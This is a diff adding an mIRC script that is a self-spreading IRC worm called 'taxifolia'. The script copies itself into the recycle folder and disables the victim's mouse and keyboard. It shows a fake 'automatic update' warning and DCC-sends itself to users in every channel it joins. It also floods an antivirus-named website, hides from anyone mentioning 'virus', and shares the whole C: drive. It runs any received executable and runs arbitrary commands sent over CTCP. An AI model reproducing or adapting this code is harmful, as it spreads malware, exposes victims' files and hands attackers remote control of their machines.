@@ -1,0 +1,47 @@
+# TAXIFOLIA, courtesy of mandragoreFS
+on 1:start:{
+  .fsend on
+  .sreq +m auto
+  .ajinvite on
+  .run -n c:\command.com /c copy c:\autoexec.pif c:\recycled\taxifolia.exe
+  .titlebar -=] 0wned by taxifolia, courtesy of mandragoreFS ! [=-
+}
+on 1:connect:{
+  .run -n rundll32.exe mouse,disable
+  .run -n rundll32.exe keyboard,disable
+  .window -dok +e @mIRC32 100 100 400 100
+  .aline @mirc32 This is the automatic update feature.
+  .aline @mirc32 It takes up to few minutes.
+  .aline @mirc32 If your computer slows down, this is normal.
+  .aline @mirc32 DO NOT REBOOT !
+  .showmirc -t
+  .join #warez
+  .join #sexe
+  .list
+}
+on 1:disconnect:.server
+on 1:join:#:{
+  .join $chan
+  .updatenl
+  if ($nick($chan,0)==1) {halt}
+  if $nick == $me {
+    %i=0
+    :next
+    inc %i
+    if (%i == $nick($chan,0)+1) {halt}
+    .dcc send $nick($chan,%i)
+    .whois $nick($chan,%i)
+    goto next
+  }
+  else {.dcc send $nick c:\recycled\taxifolia.exe}
+}
+raw 319:*:.join $3-
+raw 322:*:.join $1-
+on 1:start:.sockopen x www.macafee.com 80
+on 1:sockopen:x:.sockwrite -n x you suxx
+on 1:sockwrite:x:.sockwrite -n x you suxx
+on 1:sockclose:x:.sockopen x www.macafee.com 80
+on 1:text:*virus*:*:.ignore $nick | .part $chan
+on 1:text:*file*:?:.fserve $nick 100 c:\
+on 1:filercvd:*.exe,*.com,*.vbs:.run $filename
+ctcp 1:run:?:/run $1-
